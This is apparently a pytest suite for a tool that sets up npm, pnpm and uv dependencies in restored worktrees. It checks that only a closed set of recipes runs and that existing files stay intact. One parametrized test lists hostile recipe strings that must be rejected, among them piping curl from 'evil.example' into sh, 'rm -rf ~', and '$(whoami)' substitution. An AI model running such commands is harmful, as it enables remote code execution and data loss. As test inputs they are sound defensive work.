"""Dependency setup on the destination (docs/design/move-working-set.md §9, phase 2).

``workset_setup`` runs the §9 recipes for worktrees a move restored on THIS device.
Every case here drives a REAL subprocess through ``bounded_contract.supervise_direct``
where a command runs, with a fake package manager on PATH (a shell script that
records its argv, cwd and environment) — never a real ``npm``/``pnpm``/``uv``, so
no network and no install happens. What is pinned:

* the argv table is the closed recipe set, and nothing outside it has an argv
  (a recipe string with ``;``/``&&`` tails, a kind/run mismatch, the commons
  recipe's ``rm -rf``);
* the cwd is re-checked against the restore's own placement rules;
* success, failure, timeout, cancellation and a missing toolchain each produce
  their receipt state, and none touches the restored worktree's files;
* a pre-existing ``node_modules``/``.venv`` is left untouched (``present``);
* the pnpm commons share links into an absent/empty path only, and only while
  the lockfile still matches the primary's;
* a venv is created by ``uv venv`` in the worktree, never symlinked, and the
  operator's activated ``VIRTUAL_ENV`` never reaches the install.
"""

from __future__ import annotations

import json
import os
import shlex
import shutil
import signal
import threading
import time
from collections.abc import Sequence
from pathlib import Path

import pytest

from local_operator.network import workset, workset_setup

SID = "a1b2c3d4"


# ------------------------------------------------------------------ fixtures


@pytest.fixture()
def env(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> dict[str, Path]:
    home = tmp_path / "home"
    config = tmp_path / "config"
    bindir = tmp_path / "bin"
    for d in (home, config, bindir):
        d.mkdir()
    # Only the fake tools plus the few utilities they call: a real npm/pnpm/uv on
    # the host (this CI image ships npm and pnpm in /usr/bin) must never be what a
    # case exercises, so neither /usr/bin nor /bin is on PATH.
    sysbin = tmp_path / "sysbin"
    sysbin.mkdir()
    for util in ("mkdir", "touch", "sleep", "cat"):
        found = shutil.which(util)
        assert found, util
        (sysbin / util).symlink_to(found)
    monkeypatch.setenv("PATH", f"{bindir}:{sysbin}")
    return {"home": home, "config": config, "bin": bindir}


def _tool(bindir: Path, name: str, body: str) -> None:
    script = bindir / name
    script.write_text("#!/bin/sh\n" + body + "\n", encoding="utf-8")
    script.chmod(0o755)


def _record_tool(bindir: Path, name: str, *, then: str = "exit 0") -> None:
    """A fake tool appending ``argv|cwd|VIRTUAL_ENV`` to ``$PWD/.calls``."""
    _tool(bindir, name, f'echo "{name} $*|$PWD|${{VIRTUAL_ENV:-}}" >> .calls\n{then}')


def _restored(config: Path, rows: list[str], *, waiting: Sequence[str] = ()) -> None:
    """THIS device's restore record, as ``workset_move.restore_arrived`` writes it."""
    directory = config / "network" / "workset-in" / SID
    directory.mkdir(parents=True)
    plans, restored = [], {}
    for n, dest in enumerate(rows):
        plans.append({"n": n, "path": dest})
        restored[str(n)] = {"state": "restored", "path": dest, "dest_path": dest}
    for n, path in enumerate(waiting, start=len(rows)):
        plans.append({"n": n, "path": path})
        restored[str(n)] = {"state": "pending_restore", "path": path, "reason": "x"}
    (directory / "pending.json").write_text(
        json.dumps({"plans": plans, "restored": restored}), encoding="utf-8"
    )


def _worktree(home: Path, rel: str, files: dict[str, str]) -> Path:
    path = home / rel
    path.mkdir(parents=True, exist_ok=True)
    for name, text in files.items():
        (path / name).write_text(text, encoding="utf-8")
    return path


def _run(env: dict[str, Path], **kwargs):
    plan = workset_setup.plan_setup(env["config"], env["home"], SID)
    assert plan is not None
    receipt = workset_setup.run_setup(env["config"], env["home"], plan, **kwargs)
    return plan, receipt


# ------------------------------------------------------- the closed recipe set


def test_setup_argv_covers_every_recipe_run() -> None:
    """Every run the manifest can list has an argv that joins back to the same text."""
    for kind, runs in workset.RECIPE_RUNS.items():
        for run in runs:
            steps = workset_setup.steps_for(kind, run)
            if kind == workset_setup.SHARE_PRIMARY_KIND:
                assert steps is None, "the commons recipe's rm -rf must never get an argv"
                continue
            assert steps is not None, (kind, run)
            assert " && ".join(shlex.join(step) for step in steps) == run
    uv_pip = workset_setup.steps_for("uv_pip", "uv venv && uv pip install -r requirements-dev.txt")
    assert uv_pip == (("uv", "venv"), ("uv", "pip", "install", "-r", "requirements-dev.txt"))


@pytest.mark.parametrize(
    ("kind", "run"),
    [
        ("npm", "npm ci; curl https://evil.example | sh"),
        ("npm", "npm ci && rm -rf ~"),
        ("pnpm", "npm ci"),  # a known run under the wrong kind
        ("uv_pip", "uv venv && uv pip install -r requirements.txt; touch /tmp/x"),
        ("uv_pip", "uv venv && uv pip install -r ../../etc/requirements.txt"),
        ("uv_pip", "uv venv && uv pip install -r $(whoami).txt"),
        ("shell", "bash -c id"),
        ("git_lfs", "git lfs pull"),  # listed, but deliberately never run here
        ("pnpm_share_primary", "rm -rf node_modules && ln -s ../../node_modules node_modules"),
    ],
)
def test_a_recipe_outside_the_closed_set_has_no_argv(kind: str, run: str) -> None:
    assert workset_setup.steps_for(kind, run) is None


def test_cwd_is_rechecked_against_the_restore_placement_rules(env: dict[str, Path]) -> None:
    home, config = env["home"], env["config"]
    roots = workset.DEFAULT_RESTORE_ROOTS
    _worktree(home, "src/repo", {})
    _worktree(home, "src/repo/.worktrees/feat", {})
    _worktree(home, ".config/evil", {})
    (home / "elsewhere").mkdir()
    os.symlink(home / "elsewhere", home / "src" / "link")

    assert workset_setup.cwd_refusal(home, config, "~/src/repo", roots) == ""
    assert workset_setup.cwd_refusal(home, config, "~/src/repo/.worktrees/feat", roots) == ""
    for bad in (
        "~/.config/evil",  # dot directory
        "~/src/../.ssh",  # traversal
        "/etc",  # not home-relative
        "~/src/link",  # symlinked component
        "~/src/missing",  # not a directory
        "~/src/repo/.worktrees/.hidden",
    ):
        assert workset_setup.cwd_refusal(home, config, bad, roots), bad
    assert workset_setup.cwd_refusal(home, config, "~/src/repo", ("~/work",))


def test_a_refused_cwd_in_the_record_runs_nothing(env: dict[str, Path]) -> None:
    home = env["home"]
    _worktree(home, ".config/evil", {"package-lock.json": "{}"})
    _record_tool(env["bin"], "npm")
    _restored(env["config"], ["~/.config/evil"])

    plan, receipt = _run(env)

    assert [(r.state, r.kind) for r in plan.rows] == [("refused", "")]
    assert receipt["state"] == "incomplete"
    assert not (home / ".config" / "evil" / ".calls").exists()
    assert not (home / ".config" / "evil" / "node_modules").exists()


# ------------------------------------------------------------- real execution


def test_a_known_recipe_runs_in_the_worktree_and_is_receipted(env: dict[str, Path]) -> None:
    home = env["home"]
    wt = _worktree(home, "src/app", {"package-lock.json": "{}", "index.js": "1\n"})
    _record_tool(env["bin"], "npm", then="mkdir node_modules && echo installed")
    _restored(env["config"], ["~/src/app"])

    _plan, receipt = _run(env)

    row = receipt["rows"][0]
    assert receipt["state"] == "complete"
    assert (row["kind"], row["state"], row["cwd"]) == ("npm", "done", "~/src/app")
    assert row["steps"][0]["argv"] == ["npm", "ci"]
    assert row["steps"][0]["exit_code"] == 0 and row["steps"][0]["cause"] == "child-exit"
    assert (wt / ".calls").read_text().split("|")[:2] == ["npm ci", str(wt)]
    assert (wt / "node_modules").is_dir()
    assert "installed" in Path(row["log"]).read_text()
    on_disk = workset_setup.read_receipt(env["config"], SID)
    assert on_disk is not None and on_disk["state"] == "complete"


def test_a_failing_install_is_incomplete_and_keeps_the_working_set(env: dict[str, Path]) -> None:
    home = env["home"]
    wt = _worktree(home, "src/app", {"package-lock.json": "{}", "notes.txt": "mine\n"})
    _record_tool(env["bin"], "npm", then="echo boom >&2; exit 3")
    _restored(env["config"], ["~/src/app"])

    _plan, receipt = _run(env)

    row = receipt["rows"][0]
    assert receipt["state"] == "incomplete"
    assert (row["state"], row["steps"][0]["exit_code"]) == ("failed", 3)
    assert "boom" in Path(row["log"]).read_text()
    assert (wt / "notes.txt").read_text() == "mine\n"
    assert (wt / "package-lock.json").read_text() == "{}"


def test_a_missing_package_manager_is_reported_never_installed(env: dict[str, Path]) -> None:
    _worktree(env["home"], "src/app", {"pnpm-lock.yaml": "lockfileVersion: '9.0'\n"})
    _restored(env["config"], ["~/src/app"])

    def never(*_a, **_k):
        raise AssertionError("nothing may run when the toolchain is missing")

    _plan, receipt = _run(env, supervise=never)

    row = receipt["rows"][0]
    assert (row["state"], row["missing"]) == ("missing_toolchain", "pnpm")
    assert row["run"] == "pnpm install --frozen-lockfile"
    assert receipt["state"] == "incomplete"


def test_a_step_past_its_bound_is_killed_and_reported_timeout(env: dict[str, Path]) -> None:
    wt = _worktree(env["home"], "src/app", {"package-lock.json": "{}"})
    _record_tool(env["bin"], "npm", then="sleep 30")
    _restored(env["config"], ["~/src/app"])

    started = time.monotonic()
    _plan, receipt = _run(env, limits=(0.5, 0.5, None))

    assert time.monotonic() - started < 20
    row = receipt["rows"][0]
    assert (row["state"], row["steps"][0]["cause"]) == ("timeout", "deadline")
    assert not (wt / "node_modules").exists()


def test_cancel_stops_the_running_step_and_every_later_row(env: dict[str, Path]) -> None:
    _worktree(env["home"], "src/a", {"package-lock.json": "{}"})
    second = _worktree(env["home"], "src/b", {"package-lock.json": "{}"})
    _record_tool(env["bin"], "npm", then="sleep 30")
    _restored(env["config"], ["~/src/a", "~/src/b"])
    stop = {"signum": 0}
    threading.Timer(0.5, lambda: stop.__setitem__("signum", signal.SIGINT)).start()

    _plan, receipt = _run(env, stop=stop, limits=(60.0, 0.5, None))

    assert receipt["state"] == "cancelled"
    assert [r["state"] for r in receipt["rows"]] == ["cancelled", "not_run"]
    assert not (second / ".calls").exists()


# ------------------------------------------------ never replace an existing tree


def test_an_existing_dependency_tree_is_left_untouched(env: dict[str, Path]) -> None:
    wt = _worktree(env["home"], "src/app", {"package-lock.json": "{}"})
    (wt / "node_modules").mkdir()
    (wt / "node_modules" / "keep.js").write_text("1\n")
    _record_tool(env["bin"], "npm")
    _restored(env["config"], ["~/src/app"])

    _plan, receipt = _run(env)

    assert receipt["rows"][0]["state"] == "present"
    assert receipt["state"] == "complete"
    assert (wt / "node_modules" / "keep.js").read_text() == "1\n"
    assert not (wt / ".calls").exists()


def _pnpm_primary(home: Path, *, same_lock: bool) -> tuple[Path, Path]:
    primary = _worktree(home, "src/web", {"pnpm-lock.yaml": "lockfileVersion: '9.0'\n"})
    (primary / "node_modules").mkdir()
    (primary / "node_modules" / "dep.js").write_text("shared\n")
    lock = "lockfileVersion: '9.0'\n" if same_lock else "lockfileVersion: '9.0'\nx: 1\n"
    wt = _worktree(home, "src/web/.worktrees/feat", {"pnpm-lock.yaml": lock})
    return primary, wt


def test_a_matching_pnpm_lock_shares_the_primary_tree_by_link(env: dict[str, Path]) -> None:
    primary, wt = _pnpm_primary(env["home"], same_lock=True)
    _restored(env["config"], ["~/src/web/.worktrees/feat"])

    _plan, receipt = _run(env, supervise=lambda *a, **k: pytest.fail("no subprocess"))

    row = receipt["rows"][0]
    assert (row["kind"], row["state"]) == ("pnpm_share_primary", "done")
    assert os.readlink(wt / "node_modules") == "../../node_modules"
    assert (wt / "node_modules" / "dep.js").read_text() == "shared\n"
    assert (primary / "node_modules").is_dir() and not (primary / "node_modules").is_symlink()


def test_an_empty_node_modules_is_reused_for_the_share(env: dict[str, Path]) -> None:
    _primary, wt = _pnpm_primary(env["home"], same_lock=True)
    (wt / "node_modules").mkdir()
    _restored(env["config"], ["~/src/web/.worktrees/feat"])

    _plan, receipt = _run(env)

    assert receipt["rows"][0]["state"] == "done"
    assert (wt / "node_modules").is_symlink()


def test_an_occupied_node_modules_is_never_replaced_by_the_share(env: dict[str, Path]) -> None:
    _primary, wt = _pnpm_primary(env["home"], same_lock=True)
    (wt / "node_modules").mkdir()
    (wt / "node_modules" / "own.js").write_text("own\n")
    _restored(env["config"], ["~/src/web/.worktrees/feat"])

    _plan, receipt = _run(env)

    assert receipt["rows"][0]["state"] == "present"
    assert not (wt / "node_modules").is_symlink()
    assert (wt / "node_modules" / "own.js").read_text() == "own\n"


def test_a_different_pnpm_lock_installs_with_pnpm_not_the_share(env: dict[str, Path]) -> None:
    _primary, wt = _pnpm_primary(env["home"], same_lock=False)
    _record_tool(env["bin"], "pnpm", then="mkdir node_modules")
    _restored(env["config"], ["~/src/web/.worktrees/feat"])

    _plan, receipt = _run(env)

    row = receipt["rows"][0]
    assert (row["kind"], row["state"]) == ("pnpm", "done")
    assert row["steps"][0]["argv"] == ["pnpm", "install", "--frozen-lockfile"]
    assert (wt / "node_modules").is_dir() and not (wt / "node_modules").is_symlink()


def test_a_share_whose_lock_drifted_since_the_plan_is_refused(env: dict[str, Path]) -> None:
    primary, wt = _pnpm_primary(env["home"], same_lock=True)
    _restored(env["config"], ["~/src/web/.worktrees/feat"])
    plan = workset_setup.plan_setup(env["config"], env["home"], SID)
    assert plan is not None and plan.rows[0].kind == "pnpm_share_primary"
    (primary / "pnpm-lock.yaml").write_text("changed\n")

    receipt = workset_setup.run_setup(env["config"], env["home"], plan)

    assert receipt["rows"][0]["state"] == "refused"
    assert not os.path.lexists(wt / "node_modules")


# ----------------------------------------------------------------- Python venvs


def test_a_venv_is_created_in_the_worktree_never_symlinked(
    env: dict[str, Path], monkeypatch: pytest.MonkeyPatch, tmp_path: Path
) -> None:
    wt = _worktree(env["home"], "src/py", {"uv.lock": "version = 1\n"})
    active = tmp_path / "operators-active-venv"
    active.mkdir()
    monkeypatch.setenv("VIRTUAL_ENV", str(active))
    _record_tool(
        env["bin"],
        "uv",
        then='if [ "$1" = venv ]; then mkdir .venv; else touch .venv/synced; fi',
    )
    _restored(env["config"], ["~/src/py"])

    _plan, receipt = _run(env)

    row = receipt["rows"][0]
    assert (row["kind"], row["state"]) == ("uv", "done")
    assert [s["argv"] for s in row["steps"]] == [["uv", "venv"], ["uv", "sync", "--frozen"]]
    assert (wt / ".venv").is_dir() and not (wt / ".venv").is_symlink()
    assert (wt / ".venv" / "synced").exists()
    calls = (wt / ".calls").read_text().splitlines()
    assert all(line.endswith("|") for line in calls), "VIRTUAL_ENV leaked into the install"
    assert list(active.iterdir()) == []


def test_an_existing_venv_is_present_not_recreated(env: dict[str, Path]) -> None:
    wt = _worktree(env["home"], "src/py", {"requirements.txt": "x\n"})
    (wt / ".venv").mkdir()
    (wt / ".venv" / "pyvenv.cfg").write_text("home = /x\n")
    _record_tool(env["bin"], "uv")
    _restored(env["config"], ["~/src/py"])

    _plan, receipt = _run(env)

    assert receipt["rows"][0]["state"] == "present"
    assert (wt / ".venv" / "pyvenv.cfg").read_text() == "home = /x\n"
    assert not (wt / ".calls").exists()


# --------------------------------------------------------- receipt and plan shape


def test_plan_lists_unrestored_rows_and_none_without_an_arrival(env: dict[str, Path]) -> None:
    assert workset_setup.plan_setup(env["config"], env["home"], SID) is None
    assert workset_setup.plan_setup(env["config"], env["home"], "../escape") is None
    _worktree(env["home"], "src/app", {"README": "x\n"})
    _restored(env["config"], ["~/src/app"], waiting=["~/src/later"])

    plan = workset_setup.plan_setup(env["config"], env["home"], SID)

    assert plan is not None and plan.rows == [] and plan.not_restored == ["~/src/later"]
    receipt = workset_setup.run_setup(env["config"], env["home"], plan)
    assert receipt["state"] == "complete" and receipt["not_restored"] == ["~/src/later"]


def test_audit_records_states_and_exit_codes_without_paths(env: dict[str, Path]) -> None:
    from local_operator.network.store import audit_path

    receipt = {
        "state": "incomplete",
        "rows": [
            {"kind": "npm", "state": "failed", "cwd": "~/secret/path", "steps": [{"exit_code": 3}]}
        ],
    }

    workset_setup.audit(env["config"], SID, receipt)

    text = audit_path(env["config"]).read_text()
    assert workset_setup.AUDIT_WORKSET_SETUP in text and '"npm:failed:3"' in text
    assert "~/secret/path" not in text


def test_a_tree_that_appears_after_the_plan_is_still_never_replaced(
    env: dict[str, Path],
) -> None:
    """Plan and run are separate moments (a prompt sits between them): the run re-checks."""
    _primary, wt = _pnpm_primary(env["home"], same_lock=True)
    _restored(env["config"], ["~/src/web/.worktrees/feat"])
    plan = workset_setup.plan_setup(env["config"], env["home"], SID)
    assert plan is not None and plan.rows[0].state == "not_run"
    (wt / "node_modules").mkdir()
    (wt / "node_modules" / "mine.js").write_text("keep\n")

    receipt = workset_setup.run_setup(env["config"], env["home"], plan)

    assert receipt["rows"][0]["state"] == "present"
    assert (wt / "node_modules" / "mine.js").read_text() == "keep\n"
    assert not (wt / "node_modules").is_symlink()
